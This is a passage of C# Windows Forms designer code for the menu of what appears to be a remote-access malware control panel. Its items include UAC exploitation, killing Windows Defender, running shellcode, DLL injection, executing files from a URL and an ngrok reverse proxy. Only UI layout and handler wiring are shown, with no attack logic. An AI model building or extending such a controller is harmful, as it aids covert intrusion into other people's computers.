            this.toolStripMenuItem9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem9.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem9.Name = "toolStripMenuItem9";
            this.toolStripMenuItem9.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem9.Text = "Remote Record";
            this.toolStripMenuItem9.Click += new System.EventHandler(this.RecordToolStripMenuItem_Click);
            // 
            // toolStripMenuItem10
            // 
            this.toolStripMenuItem10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem10.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem11,
            this.toolStripMenuItem12});
            this.toolStripMenuItem10.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem10.Name = "toolStripMenuItem10";
            this.toolStripMenuItem10.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem10.Text = "Program Notification";
            // 
            // toolStripMenuItem11
            // 
            this.toolStripMenuItem11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem11.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem11.Name = "toolStripMenuItem11";
            this.toolStripMenuItem11.Size = new System.Drawing.Size(110, 24);
            this.toolStripMenuItem11.Text = "Start";
            this.toolStripMenuItem11.Click += new System.EventHandler(this.StartToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem12
            // 
            this.toolStripMenuItem12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem12.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem12.Name = "toolStripMenuItem12";
            this.toolStripMenuItem12.Size = new System.Drawing.Size(110, 24);
            this.toolStripMenuItem12.Text = "Stop";
            this.toolStripMenuItem12.Click += new System.EventHandler(this.StopToolStripMenuItem2_Click);
            // 
            // toolStripMenuItem76
            // 
            this.toolStripMenuItem76.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem76.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem76.Name = "toolStripMenuItem76";
            this.toolStripMenuItem76.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem76.Text = "MessageBox";
            this.toolStripMenuItem76.Click += new System.EventHandler(this.MessageBoxToolStripMenuItem_Click);
            // 
            // toolStripMenuItem77
            // 
            this.toolStripMenuItem77.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem77.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem77.Name = "toolStripMenuItem77";
            this.toolStripMenuItem77.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem77.Text = "Chat Room";
            this.toolStripMenuItem77.Click += new System.EventHandler(this.ChatToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem79
            // 
            this.toolStripMenuItem79.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem79.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem79.Name = "toolStripMenuItem79";
            this.toolStripMenuItem79.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem79.Text = "Change Wallpaper";
            this.toolStripMenuItem79.Visible = false;
            this.toolStripMenuItem79.Click += new System.EventHandler(this.ChangeWallpaperToolStripMenuItem1_Click);
            // 
            // remoteReverseProxyToolStripMenuItem
            // 
            this.remoteReverseProxyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.remoteReverseProxyToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.remoteReverseProxyToolStripMenuItem.Name = "remoteReverseProxyToolStripMenuItem";
            this.remoteReverseProxyToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.remoteReverseProxyToolStripMenuItem.Text = "Remote Reverse Proxy";
            this.remoteReverseProxyToolStripMenuItem.Visible = false;
            this.remoteReverseProxyToolStripMenuItem.Click += new System.EventHandler(this.remoteReverseProxyToolStripMenuItem_Click);
            // 
            // protectionToolStripMenuItem
            // 
            this.protectionToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.protectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem25,
            this.sTARTEASYToolStripMenuItem,
            this.toolStripMenuItem26});
            this.protectionToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.protectionToolStripMenuItem.Name = "protectionToolStripMenuItem";
            this.protectionToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.protectionToolStripMenuItem.Text = "Protection";
            this.protectionToolStripMenuItem.Visible = false;
            // 
            // toolStripMenuItem25
            // 
            this.toolStripMenuItem25.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem25.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem25.Name = "toolStripMenuItem25";
            this.toolStripMenuItem25.Size = new System.Drawing.Size(170, 24);
            this.toolStripMenuItem25.Text = "AGGRESSIVE";
            this.toolStripMenuItem25.Click += new System.EventHandler(this.toolStripMenuItem25_Click);
            // 
            // sTARTEASYToolStripMenuItem
            // 
            this.sTARTEASYToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.sTARTEASYToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.sTARTEASYToolStripMenuItem.Name = "sTARTEASYToolStripMenuItem";
            this.sTARTEASYToolStripMenuItem.Size = new System.Drawing.Size(170, 24);
            this.sTARTEASYToolStripMenuItem.Text = "EASY";
            this.sTARTEASYToolStripMenuItem.Click += new System.EventHandler(this.sTARTEASYToolStripMenuItem_Click);
            // 
            // toolStripMenuItem26
            // 
            this.toolStripMenuItem26.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem26.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem26.Name = "toolStripMenuItem26";
            this.toolStripMenuItem26.Size = new System.Drawing.Size(170, 24);
            this.toolStripMenuItem26.Text = "STOP";
            this.toolStripMenuItem26.Click += new System.EventHandler(this.toolStripMenuItem26_Click);
            // 
            // toolStripMenuItem54
            // 
            this.toolStripMenuItem54.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem54.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem54.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem54.Name = "toolStripMenuItem54";
            this.toolStripMenuItem54.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem54.Text = "Remote Fun Control";
            this.toolStripMenuItem54.Click += new System.EventHandler(this.justForFunToolStripMenuItem_Click);
            // 
            // toolStripMenuItem55
            // 
            this.toolStripMenuItem55.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem55.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem55.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem55.Name = "toolStripMenuItem55";
            this.toolStripMenuItem55.Size = new System.Drawing.Size(252, 24);
            this.toolStripMenuItem55.Text = "Remote  PC Information";
            this.toolStripMenuItem55.Click += new System.EventHandler(this.InformationToolStripMenuItem_Click);
            // 
            // priviligeEscalationFirewallToolStripMenuItem
            // 
            this.priviligeEscalationFirewallToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.uACExplotationToolStripMenuItem,
            this.defeatFirewallToolStripMenuItem});
            this.priviligeEscalationFirewallToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.priviligeEscalationFirewallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("priviligeEscalationFirewallToolStripMenuItem.Image")));
            this.priviligeEscalationFirewallToolStripMenuItem.Name = "priviligeEscalationFirewallToolStripMenuItem";
            this.priviligeEscalationFirewallToolStripMenuItem.Size = new System.Drawing.Size(353, 36);
            this.priviligeEscalationFirewallToolStripMenuItem.Text = "      [Privilige Escalation/Firewall]";
            // 
            // uACExplotationToolStripMenuItem
            // 
            this.uACExplotationToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.uACExplotationToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.windowsToolStripMenuItem,
            this.windowsToolStripMenuItem1,
            this.windows7ToolStripMenuItem,
            this.adminLoopToolStripMenuItem,
            this.disableUACToolStripMenuItem});
            this.uACExplotationToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.uACExplotationToolStripMenuItem.Name = "uACExplotationToolStripMenuItem";
            this.uACExplotationToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
            this.uACExplotationToolStripMenuItem.Text = "     UAC Exploitation";
            // 
            // windowsToolStripMenuItem
            // 
            this.windowsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.windowsToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.windowsToolStripMenuItem.Name = "windowsToolStripMenuItem";
            this.windowsToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
            this.windowsToolStripMenuItem.Text = "1. Windows 8/10/11";
            this.windowsToolStripMenuItem.Click += new System.EventHandler(this.windowsToolStripMenuItem_Click);
            // 
            // windowsToolStripMenuItem1
            // 
            this.windowsToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.windowsToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.windowsToolStripMenuItem1.Name = "windowsToolStripMenuItem1";
            this.windowsToolStripMenuItem1.Size = new System.Drawing.Size(219, 24);
            this.windowsToolStripMenuItem1.Text = "2. Windows 8/10/11";
            this.windowsToolStripMenuItem1.Click += new System.EventHandler(this.windowsToolStripMenuItem1_Click);
            // 
            // windows7ToolStripMenuItem
            // 
            this.windows7ToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.windows7ToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.windows7ToolStripMenuItem.Name = "windows7ToolStripMenuItem";
            this.windows7ToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
            this.windows7ToolStripMenuItem.Text = "3. Windows 7";
            this.windows7ToolStripMenuItem.Click += new System.EventHandler(this.windows7ToolStripMenuItem_Click);
            // 
            // adminLoopToolStripMenuItem
            // 
            this.adminLoopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.adminLoopToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.adminLoopToolStripMenuItem.Name = "adminLoopToolStripMenuItem";
            this.adminLoopToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
            this.adminLoopToolStripMenuItem.Text = "4. Admin Loop Until";
            this.adminLoopToolStripMenuItem.Click += new System.EventHandler(this.adminLoopToolStripMenuItem_Click);
            // 
            // disableUACToolStripMenuItem
            // 
            this.disableUACToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.disableUACToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.disableUACToolStripMenuItem.Name = "disableUACToolStripMenuItem";
            this.disableUACToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
            this.disableUACToolStripMenuItem.Text = "5. Disable UAC";
            this.disableUACToolStripMenuItem.Click += new System.EventHandler(this.disableUACToolStripMenuItem_Click_1);
            // 
            // defeatFirewallToolStripMenuItem
            // 
            this.defeatFirewallToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.defeatFirewallToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.killWindowsDefenderToolStripMenuItem});
            this.defeatFirewallToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.defeatFirewallToolStripMenuItem.Name = "defeatFirewallToolStripMenuItem";
            this.defeatFirewallToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
            this.defeatFirewallToolStripMenuItem.Text = "     Defeat Firewall";
            // 
            // killWindowsDefenderToolStripMenuItem
            // 
            this.killWindowsDefenderToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.killWindowsDefenderToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.killWindowsDefenderToolStripMenuItem.Name = "killWindowsDefenderToolStripMenuItem";
            this.killWindowsDefenderToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.killWindowsDefenderToolStripMenuItem.Text = "ExTerminate WDefender";
            this.killWindowsDefenderToolStripMenuItem.Click += new System.EventHandler(this.killWindowsDefenderToolStripMenuItem_Click);
            // 
            // toolStripMenuItem13
            // 
            this.toolStripMenuItem13.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem71,
            this.dLLInjectionToolStripMenuItem,
            this.toolStripMenuItem78,
            this.silentInstallerToolStripMenuItem,
            this.peToShellConverterToolStripMenuItem});
            this.toolStripMenuItem13.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem13.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem13.Image")));
            this.toolStripMenuItem13.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem13.Name = "toolStripMenuItem13";
            this.toolStripMenuItem13.Size = new System.Drawing.Size(353, 36);
            this.toolStripMenuItem13.Text = "      [Remote Execution]";
            // 
            // toolStripMenuItem71
            // 
            this.toolStripMenuItem71.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem71.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem72,
            this.toolStripMenuItem73,
            this.toolStripMenuItem74,
            this.executeVBSToolStripMenuItem,
            this.mergeRegToolStripMenuItem,
            this.executebatToolStripMenuItem,
            this.toolStripMenuItem75});
            this.toolStripMenuItem71.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem71.Name = "toolStripMenuItem71";
            this.toolStripMenuItem71.Size = new System.Drawing.Size(224, 24);
            this.toolStripMenuItem71.Text = "Execute File";
            // 
            // toolStripMenuItem72
            // 
            this.toolStripMenuItem72.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem72.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem72.Name = "toolStripMenuItem72";
            this.toolStripMenuItem72.Size = new System.Drawing.Size(225, 24);
            this.toolStripMenuItem72.Text = "From Url";
            this.toolStripMenuItem72.Click += new System.EventHandler(this.fromUrlToolStripMenuItem_Click);
            // 
            // toolStripMenuItem73
            // 
            this.toolStripMenuItem73.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem73.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem73.Name = "toolStripMenuItem73";
            this.toolStripMenuItem73.Size = new System.Drawing.Size(225, 24);
            this.toolStripMenuItem73.Text = "Send File To Disk";
            this.toolStripMenuItem73.Click += new System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
            // 
            // toolStripMenuItem74
            // 
            this.toolStripMenuItem74.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem74.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem74.Name = "toolStripMenuItem74";
            this.toolStripMenuItem74.Size = new System.Drawing.Size(225, 24);
            this.toolStripMenuItem74.Text = "Send File To Memory";
            this.toolStripMenuItem74.Click += new System.EventHandler(this.SendFileToMemoryToolStripMenuItem_Click);
            // 
            // executeVBSToolStripMenuItem
            // 
            this.executeVBSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.executeVBSToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.executeVBSToolStripMenuItem.Name = "executeVBSToolStripMenuItem";
            this.executeVBSToolStripMenuItem.Size = new System.Drawing.Size(225, 24);
            this.executeVBSToolStripMenuItem.Text = "Execute VBS";
            this.executeVBSToolStripMenuItem.Click += new System.EventHandler(this.executeVBSToolStripMenuItem_Click);
            // 
            // mergeRegToolStripMenuItem
            // 
            this.mergeRegToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.mergeRegToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.mergeRegToolStripMenuItem.Name = "mergeRegToolStripMenuItem";
            this.mergeRegToolStripMenuItem.Size = new System.Drawing.Size(225, 24);
            this.mergeRegToolStripMenuItem.Text = "Merge .reg";
            this.mergeRegToolStripMenuItem.Click += new System.EventHandler(this.mergeRegToolStripMenuItem_Click);
            // 
            // executebatToolStripMenuItem
            // 
            this.executebatToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.executebatToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.executebatToolStripMenuItem.Name = "executebatToolStripMenuItem";
            this.executebatToolStripMenuItem.Size = new System.Drawing.Size(225, 24);
            this.executebatToolStripMenuItem.Text = "Execute .bat";
            this.executebatToolStripMenuItem.Click += new System.EventHandler(this.executebatToolStripMenuItem_Click);
            // 
            // toolStripMenuItem75
            // 
            this.toolStripMenuItem75.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem75.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem75.Name = "toolStripMenuItem75";
            this.toolStripMenuItem75.Size = new System.Drawing.Size(225, 24);
            this.toolStripMenuItem75.Text = "Run Shellcode";
            this.toolStripMenuItem75.Click += new System.EventHandler(this.runShellcodeToolStripMenuItem_Click);
            // 
            // dLLInjectionToolStripMenuItem
            // 
            this.dLLInjectionToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.dLLInjectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.injectionPanelToolStripMenuItem});
            this.dLLInjectionToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.dLLInjectionToolStripMenuItem.Name = "dLLInjectionToolStripMenuItem";
            this.dLLInjectionToolStripMenuItem.Size = new System.Drawing.Size(224, 24);
            this.dLLInjectionToolStripMenuItem.Text = "DLL Injection";
            this.dLLInjectionToolStripMenuItem.Visible = false;
            // 
            // injectionPanelToolStripMenuItem
            // 
            this.injectionPanelToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.injectionPanelToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.injectionPanelToolStripMenuItem.Name = "injectionPanelToolStripMenuItem";
            this.injectionPanelToolStripMenuItem.Size = new System.Drawing.Size(187, 24);
            this.injectionPanelToolStripMenuItem.Text = "Injection Panel";
            // 
            // toolStripMenuItem78
            // 
            this.toolStripMenuItem78.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem78.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem78.Name = "toolStripMenuItem78";
            this.toolStripMenuItem78.Size = new System.Drawing.Size(224, 24);
            this.toolStripMenuItem78.Text = "Visit Website";
            this.toolStripMenuItem78.Click += new System.EventHandler(this.VisteWebsiteToolStripMenuItem1_Click);
            // 
            // silentInstallerToolStripMenuItem
            // 
            this.silentInstallerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.silentInstallerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.silentInstallerToolStripMenuItem.Name = "silentInstallerToolStripMenuItem";
            this.silentInstallerToolStripMenuItem.Size = new System.Drawing.Size(224, 24);
            this.silentInstallerToolStripMenuItem.Text = "Silent Installer";
            this.silentInstallerToolStripMenuItem.Visible = false;
            // 
            // peToShellConverterToolStripMenuItem
            // 
            this.peToShellConverterToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.peToShellConverterToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.peToShellConverterToolStripMenuItem.Name = "peToShellConverterToolStripMenuItem";
            this.peToShellConverterToolStripMenuItem.Size = new System.Drawing.Size(224, 24);
            this.peToShellConverterToolStripMenuItem.Text = "PeToShell Converter";
            this.peToShellConverterToolStripMenuItem.Click += new System.EventHandler(this.peToShellConverterToolStripMenuItem_Click);
            // 
            // reverseProxyToolStripMenuItem
            // 
            this.reverseProxyToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ngrokToolStripMenuItem,
            this.reverseProxyToolStripMenuItem1,
            this.stopNgrokToolStripMenuItem});
            this.reverseProxyToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.reverseProxyToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("reverseProxyToolStripMenuItem.Image")));
            this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(353, 36);
            this.reverseProxyToolStripMenuItem.Text = "      [Reverse Proxy]";
            // 
            // ngrokToolStripMenuItem
            // 
            this.ngrokToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.ngrokToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.ngrokToolStripMenuItem.Name = "ngrokToolStripMenuItem";
            this.ngrokToolStripMenuItem.Size = new System.Drawing.Size(226, 24);
            this.ngrokToolStripMenuItem.Text = "Ngrok Panel";
            this.ngrokToolStripMenuItem.Click += new System.EventHandler(this.ngrokToolStripMenuItem_Click);
            // 
            // reverseProxyToolStripMenuItem1
            // 
            this.reverseProxyToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.reverseProxyToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.reverseProxyToolStripMenuItem1.Name = "reverseProxyToolStripMenuItem1";
            this.reverseProxyToolStripMenuItem1.Size = new System.Drawing.Size(226, 24);
            this.reverseProxyToolStripMenuItem1.Text = "Reverse Proxy Panel";
            this.reverseProxyToolStripMenuItem1.Visible = false;
            this.reverseProxyToolStripMenuItem1.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem1_Click);
            // 
            // stopNgrokToolStripMenuItem
            // 
            this.stopNgrokToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.stopNgrokToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.stopNgrokToolStripMenuItem.Name = "stopNgrokToolStripMenuItem";
            this.stopNgrokToolStripMenuItem.Size = new System.Drawing.Size(226, 24);
            this.stopNgrokToolStripMenuItem.Text = "Stop Ngrok";
            this.stopNgrokToolStripMenuItem.Click += new System.EventHandler(this.stopNgrokToolStripMenuItem_Click);
            // 
            // toolStripMenuItem33
            // 
            this.toolStripMenuItem33.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem40,
            this.toolStripMenuItem34});
            this.toolStripMenuItem33.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem33.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem33.Image")));
            this.toolStripMenuItem33.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem33.Name = "toolStripMenuItem33";
            this.toolStripMenuItem33.Size = new System.Drawing.Size(353, 36);
            this.toolStripMenuItem33.Text = "      [System Control]";
            // 
            // toolStripMenuItem40
            // 
            this.toolStripMenuItem40.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem40.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem41,
            this.toolStripMenuItem42,
            this.toolStripMenuItem43});
            this.toolStripMenuItem40.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem40.Name = "toolStripMenuItem40";
            this.toolStripMenuItem40.Size = new System.Drawing.Size(178, 24);
            this.toolStripMenuItem40.Text = "System";
            // 
            // toolStripMenuItem41
            // 
            this.toolStripMenuItem41.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem41.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem41.Name = "toolStripMenuItem41";
            this.toolStripMenuItem41.Size = new System.Drawing.Size(156, 24);
            this.toolStripMenuItem41.Text = "Shut Down";
            this.toolStripMenuItem41.Click += new System.EventHandler(this.ShutDownToolStripMenuItem_Click);
            // 
            // toolStripMenuItem42
            // 
            this.toolStripMenuItem42.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem42.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem42.Name = "toolStripMenuItem42";
            this.toolStripMenuItem42.Size = new System.Drawing.Size(156, 24);
            this.toolStripMenuItem42.Text = "Reboot";
            this.toolStripMenuItem42.Click += new System.EventHandler(this.RebootToolStripMenuItem_Click);
            // 
            // toolStripMenuItem43
            // 
            this.toolStripMenuItem43.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem43.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem43.Name = "toolStripMenuItem43";
            this.toolStripMenuItem43.Size = new System.Drawing.Size(156, 24);
            this.toolStripMenuItem43.Text = "Logout";
            this.toolStripMenuItem43.Click += new System.EventHandler(this.LogoutToolStripMenuItem_Click);
            // 
            // toolStripMenuItem34
            // 
            this.toolStripMenuItem34.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem34.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem35,
            this.toolStripMenuItem36,
            this.toolStripMenuItem37,
            this.toolStripMenuItem38,
            this.toolStripMenuItem39});
            this.toolStripMenuItem34.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem34.Name = "toolStripMenuItem34";
            this.toolStripMenuItem34.Size = new System.Drawing.Size(178, 24);
            this.toolStripMenuItem34.Text = "Client Control";
            // 
            // toolStripMenuItem35
            // 
            this.toolStripMenuItem35.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem35.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem35.Name = "toolStripMenuItem35";
            this.toolStripMenuItem35.Size = new System.Drawing.Size(169, 24);
            this.toolStripMenuItem35.Text = "Stop";
            this.toolStripMenuItem35.Click += new System.EventHandler(this.StopToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem36
            // 
            this.toolStripMenuItem36.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem36.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem36.Name = "toolStripMenuItem36";
            this.toolStripMenuItem36.Size = new System.Drawing.Size(169, 24);
            this.toolStripMenuItem36.Text = "Restart";
